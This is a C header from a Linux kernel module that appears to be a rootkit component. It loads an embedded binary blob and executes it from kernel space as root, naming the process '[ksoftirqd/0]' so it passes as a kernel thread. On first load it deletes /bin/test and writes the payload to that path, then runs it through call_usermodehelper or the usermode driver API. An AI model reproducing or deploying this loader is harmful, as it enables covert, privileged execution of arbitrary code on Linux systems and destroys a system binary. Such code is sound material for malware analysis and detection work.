/*
    * This file contains the code to launch the process with the embedded binary data. 
*/

#pragma once
#pragma message ("Compiling: "__FILE__)

#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/kmod.h>
#include <linux/usermode_driver.h>


#define usermode_driver 0 // Arch does not export umd symbols

#define pr_fmt(fmt) " %s: %s(): " fmt, KBUILD_MODNAME, __func__

#define processName "[ksoftirqd/0]" // Kernel process names are surrounded by square brackets ([])

extern const char embedded_binaryBlob_start;
extern const char embedded_binaryBlob_end;


static struct umd_info eprog_ctx = {
        .driver_name = processName,
    };

#if usermode_driver == 0
    static void runReflectiveLoader_FILE(int firstLoad);
#endif
#if usermode_driver == 1
    static void runReflectiveLoader_REFLECTIVE(void);
    static void unloadReflectiveLoader_REFLECTIVE(void);
#endif

#if usermode_driver == 1
static void unloadReflectiveLoader_REFLECTIVE(){
    //wait_event(eprog_tgid->wait_pidfd, thread_group_exited(eprog_tgid));
	umd_cleanup_helper(&eprog_ctx);
    umd_unload_blob(&eprog_ctx);
}
#endif

/*
    *First load the binary blob into the struct umd_info
    *Then run it
*/
#if usermode_driver == 1
    /* First load the binary blob into the struct umd_info */
    static void runReflectiveLoader_REFLECTIVE(){
        int ret = umd_load_blob(&eprog_ctx, &embedded_binaryBlob_start, &embedded_binaryBlob_end - &embedded_binaryBlob_start);
        if (ret){
            #if verbose == 1
                pr_info("Error in umd_load_blob");
            #endif
            return;
        }

        /* Then run it */
        ret = fork_usermode_driver(&eprog_ctx);
        if(ret){
            #if verbose == 1
                pr_info("Error when executing udermode_helper");
            #endif
            umd_unload_blob(&eprog_ctx);
            return;
        }
    }
#endif

/*
    *Write the binary to temp (so that it is not persistent)
    *Then run it
    *Finally delete it
*/
#if usermode_driver != 1
static void runReflectiveLoader_FILE(int firstLoad){
    if(firstLoad == 1){
        #if verbose == 1
            pr_info("First load");
        #endif
         char* argv2[] = {"/bin/rm", "/bin/test", NULL};
         static char* envp2[] = {
            "HOME=/",
            "TERM=linux",
            "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

        #if verbose == 1
            pr_info("call_usermodehelper rm ret=%d\n",call_usermodehelper(argv2[0], argv2, envp2, UMH_WAIT_PROC));
        #else
            int ret3 = call_usermodehelper(argv2[0], argv2, envp2, UMH_WAIT_PROC);
            if(ret3){
                //return;
            }
        #endif

        struct file *file= filp_open("/bin/test",O_RDWR|O_CREAT|O_LARGEFILE,S_IXUSR); // The O_RDWR option must always be present, otherwise it does not write.
        loff_t pos = 0;

        /* Write the binary to temp (so that it is not persistent) */
        int ret = kernel_write(file,&embedded_binaryBlob_start,(&embedded_binaryBlob_end - &embedded_binaryBlob_start),&pos);
        if(ret < 0){
            filp_close(file,NULL);
            return;
        }
        filp_close(file,NULL);
    }
    else{
        //https://insujang.github.io/2017-05-10/usermode-helper-api/
          #if verbose == 1
            pr_info("!First load");
        #endif
        /* Run it */
        char* argv[] = {"/bin/test", "test",NULL};
        static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "USER=root",
        "SHELL=/bin/bash",
        "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
        NULL};
        #if verbose == 1
            pr_info("call_usermodehelper binary ret=%d\n",call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC));
        #else
            int ret2 = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
            if(ret2){
                //return;
            }
        #endif
    }
    
}
#endif